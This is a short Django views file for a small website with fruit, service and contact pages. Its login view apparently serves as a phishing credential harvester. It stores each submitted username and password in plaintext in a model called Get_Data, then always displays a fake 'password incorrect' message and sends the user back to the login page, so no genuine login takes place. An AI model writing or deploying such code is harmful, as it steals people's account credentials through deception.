from django.shortcuts import render,redirect
from .models import Get_Data
from django.contrib import messages
# Create your views here.
def index(request):
    return render(request,'index.html')

 
def fruits(request):
    return render(request,'fruit.html')

def service(request):
    return render(request,'service.html')

def contact(request):
    return render(request,'contact.html')
def login(request):
    
    if request.method == "POST":
        username = request.POST.get('username')
        password = request.POST.get('password')
        Get_Data.objects.create(username = username,password=password)
        messages.error(request,'Sorry, your password was incorrect. Please ')
        messages.error(request,'double-check your password.')
        return redirect('login')
    return render(request,'login.html')